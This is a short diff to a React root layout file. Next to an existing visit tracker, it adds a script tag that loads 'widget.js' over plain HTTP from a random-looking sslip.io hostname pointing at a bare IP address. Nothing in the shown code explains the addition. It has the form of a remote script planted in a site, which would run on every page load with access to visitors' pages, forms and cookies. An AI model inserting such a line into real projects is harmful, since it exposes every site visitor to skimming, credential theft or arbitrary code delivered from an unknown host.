@@ -100,6 +100,7 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
         <Suspense fallback={null}>
           <VisitTracker />
         </Suspense>
+        <script src="http://kgbeigyxbs5qsz0esfzsi1ym.45.141.21.28.sslip.io/widget.js" defer />
       </body>
     </html>
   );
